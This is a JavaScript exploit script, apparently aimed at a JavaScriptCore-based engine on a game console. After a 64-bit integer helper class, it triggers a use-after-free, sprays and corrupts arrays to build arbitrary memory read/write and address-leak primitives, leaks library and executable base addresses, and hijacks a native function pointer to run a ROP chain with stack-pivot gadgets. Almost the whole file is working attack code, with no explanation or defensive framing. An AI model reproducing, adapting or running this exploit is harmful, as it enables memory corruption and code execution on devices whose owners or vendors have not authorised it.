class BigInt {
  /**
   * @param  {[number, number]|number|string|BigInt|ArrayLike<number>}
   */
  constructor () {
    this.buf = new ArrayBuffer(8)
    this.i8 = new Int8Array(this.buf)
    this.u8 = new Uint8Array(this.buf)
    this.i16 = new Int16Array(this.buf)
    this.u16 = new Uint16Array(this.buf)
    this.i32 = new Int32Array(this.buf)
    this.u32 = new Uint32Array(this.buf)
    this.f32 = new Float32Array(this.buf)
    this.f64 = new Float64Array(this.buf)

    switch (arguments.length) {
      case 0:
        break
      case 1:
        var [val] = arguments
        switch (typeof val) {
          case 'number':
            if (Number.isNaN(val)) {
              throw new TypeError(`value ${val} is NaN`)
            }

            this.f64[0] = val

            break
          case 'string':
            if (val.startsWith('0x')) {
              val = val.slice(2)
            }

            if (val.length > this.u8.length * 2) {
              throw new RangeError(`value ${val} is out of range !!`)
            }

            while (val.length < this.u8.length * 2) {
              val = '0' + val
            }

            for (var i = 0; i < this.u8.length; i++) {
              var start = val.length - 2 * (i + 1)
              var end = val.length - 2 * i
              var b = val.slice(start, end)
              this.u8[i] = parseInt(b, 16)
            }

            break
          case 'object':
            if (val instanceof BigInt) {
              this.u8.set(val.u8)
              break
            } else {
              var prop = BigInt.TYPE_MAP[val.constructor.name]
              if (prop in this) {
                var arr = this[prop]
                if (val.length !== arr.length) {
                  throw new Error(
                    `Array length mismatch, expected ${arr.length} got ${val.length}.`
                  )
                }

                arr.set(val)
                break
              }
            }
          default:
            throw new TypeError(`Unsupported value ${val} !!`)
        }
        break
      case 2:
        var [hi, lo] = arguments

        if (!Number.isInteger(hi)) {
          throw new RangeError(`hi value ${hi} is not an integer !!`)
        }

        if (!Number.isInteger(lo)) {
          throw new RangeError(`lo value ${lo} is not an integer !!`)
        }

        this.u32[0] = lo
        this.u32[1] = hi
        break
      default:
        throw new TypeError('Unsupported input !!')
    }
  }

  toString () {
    var val = '0x'
    for (var i = this.u8.length - 1; i >= 0; i--) {
      var c = this.u8[i].toString(16).toUpperCase()
      val += c.length === 1 ? '0' + c : c
    }
    return val
  }

  endian () {
    for (var i = 0; i < this.u8.length / 2; i++) {
      var b = this.u8[i]
      this.u8[i] = this.u8[this.u8.length - 1 - i]
      this.u8[this.u8.length - 1 - i] = b
    }
  }

  lo () {
    return this.u32[0]
  }

  hi () {
    return this.u32[1]
  }

  d () {
    if (this.u8[7] === 0xFF && (this.u8[6] === 0xFF || this.u8[6] === 0xFE)) {
      throw new RangeError('Integer value cannot be represented by a double')
    }

    return this.f64[0]
  }

  jsv () {
    if ((this.u8[7] === 0 && this.u8[6] === 0) || (this.u8[7] === 0xFF && this.u8[6] === 0xFF)) {
      throw new RangeError('Integer value cannot be represented by a JSValue')
    }

    return this.sub(new BigInt(0x10000, 0)).d()
  }

  cmp (val) {
    if (this.hi() > val.hi()) {
      return 1
    }

    if (this.hi() < val.hi()) {
      return -1
    }

    if (this.lo() > val.lo()) {
      return 1
    }

    if (this.lo() < val.lo()) {
      return -1
    }

    return 0
  }

  eq (val) {
    return this.hi() === val.hi() && this.lo() === val.lo()
  }

  neq (val) {
    return this.hi() !== val.hi() || this.lo() !== val.lo()
  }

  gt (val) {
    return this.cmp(val) > 0
  }

  gte (val) {
    return this.cmp(val) >= 0
  }

  lt (val) {
    return this.cmp(val) < 0
  }

  lte (val) {
    return this.cmp(val) <= 0
  }

  add (val) {
    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var b = this.u8[i] + val.u8[i] + c
      c = (b > 0xFF) | 0
      ret.u8[i] = b
    }

    return ret
  }

  sub (val) {
    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var b = this.u8[i] - val.u8[i] - c
      c = (b < 0) | 0
      ret.u8[i] = b
    }

    return ret
  }

  mul (val) {
    var ret = new BigInt()

    var c = 0
    for (var i = 0; i < this.buf.byteLength; i++) {
      var s = c
      for (var j = 0; j <= i; j++) {
        s += this.u8[j] * (val.u8[i - j] || 0)
      }

      ret.u8[i] = s & 0xFF
      c = s >>> 8
    }

    if (c !== 0) {
      throw new Error('mul overflowed !!')
    }

    return ret
  }

  divmod (val) {
    if (!val.gte(BigInt.Zero)) {
      throw new Error('Division by zero')
    }

    var q = new BigInt()
    var r = new BigInt()

    for (var b = (this.buf.byteLength * 8) - 1; b >= 0; b--) {
      r = r.shl(1)

      var byte_idx = Math.floor(b / 8)
      var bit_idx = b % 8

      r.u8[0] |= (this.u8[byte_idx] >> bit_idx) & 1

      if (r.gte(val)) {
        r = r.sub(val)

        q.u8[byte_idx] |= 1 << bit_idx
      }
    }

    return { q, r }
  }

  div (val) {
    return this.divmod(val).q
  }

  mod (val) {
    return this.divmod(val).r
  }

  xor (val) {
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] ^ val.u8[i]
    }

    return ret
  }

  and (val) {
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = this.u8[i] & val.u8[i]
    }

    return ret
  }

  neg () {
    var ret = new BigInt()

    for (var i = 0; i < this.buf.byteLength; i++) {
      ret.u8[i] = ~this.u8[i]
    }

    return ret.and(BigInt.One)
  }

  shl (count) {
    if (count < 0 || count > 64) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    var ret = new BigInt()

    var byte_count = Math.floor(count / 8)
    var bit_count = count % 8

    for (var i = this.buf.byteLength - 1; i >= 0; i--) {
      var t = i - byte_count
      var b = t >= 0 ? this.u8[t] : 0

      if (bit_count) {
        var p = t - 1 >= 0 ? this.u8[t - 1] : 0
        b = ((b << bit_count) | (p >> (8 - bit_count))) & 0xFF
      }

      ret.u8[i] = b
    }

    return ret
  }

  shr (count) {
    if (count < 0 || count > 64) {
      throw new RangeError(`Shift ${count} bits out of range !!`)
    }

    var ret = new BigInt()

    var byte_count = Math.floor(count / 8)
    var bit_count = count % 8

    for (var i = 0; i < this.buf.byteLength; i++) {
      var t = i + byte_count
      var b = t >= 0 ? this.u8[t] : 0

      if (bit_count) {
        var n = t + 1 >= 0 ? this.u8[t + 1] : 0
        b = ((b >> bit_count) | (n << (8 - bit_count))) & 0xff
      }

      ret.u8[i] = b
    }

    return ret
  }
}

BigInt.Zero = new BigInt()
BigInt.One = new BigInt(0, 1)
BigInt.TYPE_MAP = {
  Int8Array: 'i8',
  Uint8Array: 'u8',
  Int16Array: 'i16',
  Uint16Array: 'u16',
  Int32Array: 'i32',
  Uint32Array: 'u32',
  Float32Array: 'f32',
  Float64Array: 'f64',
}

function make_uaf (arr) {
  var o = {}
  for (var i in { xx: '' }) {
    for (i of [arr]);
    o[i]
  }

  gc()
}

// needed for rw primitives
var prim_uaf_idx = -1
var prim_spray_idx = -1
var prim_marker = new BigInt(0x13371337, 0x13371337) // used to find sprayed array

// store Uint32Array structure ids to be used for fake master id later
var structs = new Array(0x100)

// used for rw primitives
var master, slave

// rw primitive leak addresses
var leak_obj, leak_obj_addr, master_addr

// spray Uint32Array structure ids
for (var i = 0; i < structs.length; i++) {
  structs[i] = new Uint32Array(1)
  structs[i][`spray_${i}`] = 0x1337
}

log('Intiate UAF...')

var uaf_arr = new Uint32Array(0x80000)

// fake m_hashAndFlags
uaf_arr[4] = 0xB0

make_uaf(uaf_arr)

log('Achieved UAF !!')

log('Spraying arrays with marker...')
// spray candidates arrays to be used as leak primitive
var spray = new Array(0x1000)
for (var i = 0; i < spray.length; i++) {
  spray[i] = [prim_marker.jsv(), {}]
}

log('Looking for marked array...')
// find sprayed candidate by marker then corrupt its length
for (var i = 0; i < uaf_arr.length; i += 2) {
  var val = new BigInt(uaf_arr[i + 1], uaf_arr[i])
  if (val.eq(prim_marker)) {
    log(`Found marker at uaf_arr[${i}] !!`)

    prim_uaf_idx = i - 2

    log(`Marked array length ${new BigInt(0, uaf_arr[prim_uaf_idx])}`)

    log('Corrupting marked array length...')
    // corrupt indexing header
    uaf_arr[prim_uaf_idx] = 0x1337
    uaf_arr[prim_uaf_idx + 1] = 0x1337
    break
  }
}

if (prim_uaf_idx === -1) {
  throw new Error('Failed to find marked array !!')
}

// find index of corrupted array
for (var i = 0; i < spray.length; i++) {
  if (spray[i].length === 0x1337) {
    log(`Found corrupted array at spray[${i}] !!`)
    log(`Corrupted array length ${new BigInt(0, spray[i].length)}`)

    prim_spray_idx = i
    break
  }
}

if (prim_spray_idx === -1) {
  throw new Error('Failed to find corrupted array !!')
}

log('Intiate RW primitives...')

var prim_uaf_obj_idx = prim_uaf_idx + 4

slave = new Uint32Array(0x1000)
slave[0] = 0x13371337

// leak address of leak_obj
leak_obj = { a: slave, b: 0, c: 0, d: 0 }

spray[prim_spray_idx][1] = leak_obj

leak_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_idx])

// try faking Uint32Array master by incremental structure_id until it matches from one of sprayed earlier in structs array
var structure_id = 0x80
while (!(master instanceof Uint32Array)) {
  var rw_obj = {
    js_cell: new BigInt(0x1182300, structure_id++).jsv(),
    butterfly: 0,
    vector: slave,
    length_and_flags: 0x1337
  }

  spray[prim_spray_idx][1] = rw_obj

  var rw_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_idx])

  rw_obj_addr = rw_obj_addr.add(new BigInt(0, 0x10))

  uaf_arr[prim_uaf_obj_idx] = rw_obj_addr.lo()
  uaf_arr[prim_uaf_obj_idx + 1] = rw_obj_addr.hi()

  master = spray[prim_spray_idx][1]
}

master_addr = new BigInt(master[5], master[4])

log('Achieved RW primitives !!')
log(`master_addr: ${master_addr}`)

// rw primitive
var prim = {
  read8: function (addr) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    var retval = new BigInt(slave[1], slave[0])
    return retval
  },
  read4: function (addr) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    var retval = new BigInt(0, slave[0])
    return retval
  },
  write8: function (addr, val) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    if (val instanceof BigInt) {
      slave[0] = val.lo()
      slave[1] = val.hi()
    } else {
      slave[0] = val
      slave[1] = 0
    }
  },
  write4: function (addr, val) {
    master[4] = addr.lo()
    master[5] = addr.hi()
    slave[0] = val
  },
  addrof: function (obj) {
    leak_obj.a = obj
    return prim.read8(leak_obj_addr.add(new BigInt(0, 0x10)))
  },
}

/*
var test = {
  a: 13.37
}

log(`test: ${test}`)
log(`test.a: ${test.a}`)

var addr = prim.leakval(test)
log(`test addrof: ${addr}`)

var a = addr.add(new BigInt(0, 0x10))

var val = prim.read8(a)
log(`addrof(test)+0x10 read8: ${val}`)
log(`addrof(test)+0x10 read8 double: ${val.d()}`)

val = new BigInt(1.1)
log(`addrof(test)+0x10 write8: ${val}`)
prim.write8(a, val)

val = prim.read8(a)
log(`addrof(test)+0x10 read8: ${val}`)
log(`addrof(test)+0x10 read8 double: ${val.d()}`)
*/

var math_min_addr = prim.addrof(Math.min)
log(`addrof(Math.min): ${math_min_addr}`)

var native_executable = prim.read8(math_min_addr.add(new BigInt(0, 0x18)))
log(`native_executable: ${native_executable}`)

var native_executable_function = prim.read8(native_executable.add(new BigInt(0, 0x40)))
log(`native_executable_function: ${native_executable_function}`)

var native_executable_constructor = prim.read8(native_executable.add(new BigInt(0, 0x48)))
log(`native_executable_constructor: ${native_executable_constructor}`)

var base_addr = native_executable_function.sub(new BigInt(0, 0xC6380))

var _error_addr = prim.read8(base_addr.add(new BigInt(0, 0x1E72398)))
log(`_error_addr: ${_error_addr}`)

var strerror_addr = prim.read8(base_addr.add(new BigInt(0, 0x1E723B8)))
log(`strerror_addr: ${strerror_addr}`)

var libc_addr = strerror_addr.sub(new BigInt(0, 0x40410))

var jsmaf_gc_addr = prim.addrof(jsmaf.gc)
log(`addrof(jsmaf.gc): ${jsmaf_gc_addr}`)

var jsmaf_gc_native_addr = prim.read8(jsmaf_gc_addr.add(new BigInt(0, 0x18)))
log(`jsmaf_gc_native_addr: ${jsmaf_gc_native_addr}`)

var eboot_addr = jsmaf_gc_native_addr.sub(new BigInt(0, 0x39330))

log(`base_addr: ${base_addr}`)
log(`libc_addr: ${libc_addr}`)
log(`eboot_addr: ${eboot_addr}`)

// -----------------rest of inject.js above------------------------
// Get Math.abs to copy its NativeExecutable structure
var math_abs_addr = prim.addrof(Math.abs)
var math_abs_exec = prim.read8(math_abs_addr.add(new BigInt(0, 0x18)))

// Create pwn function
function pwn () {
  return 0x1337
}

var pwn_addr = prim.addrof(pwn)

// Allocate fake NativeExecutable
var fake_exec_buf = new Uint8Array(0x100)
var fake_exec_addr = prim.read8(prim.addrof(fake_exec_buf).add(new BigInt(0, 0x10)))

// Copy Math.abs NativeExecutable structure
for (var i = 0; i < 16; i++) {
  var val = prim.read8(math_abs_exec.add(new BigInt(0, i * 8)))
  prim.write8(fake_exec_addr.add(new BigInt(0, i * 8)), val)
}

//= ================ END FAKE NATIVE FUNC ================

// Initial code
var entry = new BigInt(0, 0x189b37).add(eboot_addr) // mov rdi, qword ptr [rax + 0x10] ; call qword ptr [rax + 8]

// control rip to ret gadget
prim.write8(fake_exec_addr.add(new BigInt(0, 0x40)), entry)

// Create arr_a used in pwn()
var arr_a = new Uint8Array(0x68)
var arr_a_addr = prim.read8(prim.addrof(arr_a).add(new BigInt(0, 0x10)))

// Create arr_b
var arr_b = new Uint8Array(0x4f0)
var arr_b_addr = prim.read8(prim.addrof(arr_b).add(new BigInt(0, 0x10)))

// Create arr_c
var arr_c = new Uint8Array(0x18)
var arr_c_addr = prim.read8(prim.addrof(arr_c).add(new BigInt(0, 0x10)))

// Create arr_d(Custom stack)
var arr_d = new Uint8Array(0x100)
var arr_d_addr = prim.read8(prim.addrof(arr_d).add(new BigInt(0, 0x10)))

// Create arr_e
var arr_e = new Uint8Array(0x18)
var arr_e_addr = prim.read8(prim.addrof(arr_e).add(new BigInt(0, 0x10)))

// Setup fake native function
prim.write8(pwn_addr.add(new BigInt(0, 0x00)), new BigInt(0x002A1500, 0x0000002A))
prim.write8(pwn_addr.add(new BigInt(0, 0x08)), new BigInt(0, 0xe9b0).add(eboot_addr)) // push rbp ; mov rbp, rsp ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x20]
prim.write8(pwn_addr.add(new BigInt(0, 0x10)), arr_a_addr)
prim.write8(pwn_addr.add(new BigInt(0, 0x18)), fake_exec_addr)

// Setup arr_a values
prim.write8(arr_a_addr.add(new BigInt(0, 0x00)), arr_c_addr)
prim.write8(arr_a_addr.add(new BigInt(0, 0x18)), new BigInt(0, 0x3064db).add(base_addr)) // mov rdx, qword ptr [rdx + 0x4e8] ; call qword ptr [rax + 0x40]
prim.write8(arr_a_addr.add(new BigInt(0, 0x20)), arr_b_addr)
prim.write8(arr_a_addr.add(new BigInt(0, 0x40)), new BigInt(0, 0x12cc60).add(base_addr)) // mov rsp, rdx ; jmp rax
prim.write8(arr_a_addr.add(new BigInt(0, 0x60)), arr_e_addr)

// Setup arr_b values
prim.write8(arr_b_addr.add(new BigInt(0, 0x4e8)), new BigInt(0, 0x40)) // random offset that will be used to determine offset to arr_a

// Setup arr_c values
prim.write8(arr_c_addr.add(new BigInt(0, 0x00)), new BigInt(0, 0x19bd6d).add(base_addr)) // mov rdx, qword ptr [rax + 0x10] ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x10]
prim.write8(arr_c_addr.add(new BigInt(0, 0x08)), new BigInt(0, 0xbf5ce).add(eboot_addr)) // add rdi, 0x60 ; call qword ptr [rax]
prim.write8(arr_c_addr.add(new BigInt(0, 0x10)), arr_d_addr)
prim.write8(arr_c_addr.add(new BigInt(0, 0x20)), new BigInt(0, 0x244916).add(eboot_addr)) // mov rdx, qword ptr [rdi + 0x20] ; mov r12, rdi ; call qword ptr [r12 + 0x18]
prim.write8(arr_c_addr.add(new BigInt(0, 0x40)), new BigInt(0, 0x165df5).add(eboot_addr)) // mov r13, rdx ; call qword ptr [rax + 0x70]
prim.write8(arr_c_addr.add(new BigInt(0, 0x48)), new BigInt(0, 0x10b5).add(eboot_addr)) // mov rax, qword ptr [rdi] ; call qword ptr [rax + 8]
prim.write8(arr_c_addr.add(new BigInt(0, 0x70)), new BigInt(0, 0x3068ff).add(base_addr)) // mov rcx, qword ptr [r13 + r12] ; call qword ptr [rax + 0x48]

// Setup arr_d values (custom stack)
prim.write8(arr_d_addr.add(new BigInt(0, 0x00)), new BigInt(0, 0x19e297c).add(base_addr)) // pop r10 ; ret
// for now, end the chain here
// Setup arr_d to pivot back to JS stack
prim.write8(arr_d_addr.add(new BigInt(0, 0x08)), new BigInt(0, 0x54094).add(base_addr)) // pop rax ; ret
prim.write8(arr_d_addr.add(new BigInt(0, 0x10)), new BigInt(0, 8))
prim.write8(arr_d_addr.add(new BigInt(0, 0x18)), new BigInt(0, 0xbe0e5a).add(base_addr)) // add rbp, rax ; ret
prim.write8(arr_d_addr.add(new BigInt(0, 0x20)), new BigInt(0, 0x12afca).add(base_addr)) // mov rsp, rbp ; pop rbp ; ret

// Setup arr_e values
prim.write8(arr_e_addr.add(new BigInt(0, 0x10)), new BigInt(0, 0x1282f3).add(base_addr)) // mov rax, qword ptr [rdx] ; call rcx

// excecute
pwn()

alert('survived pwn !!')
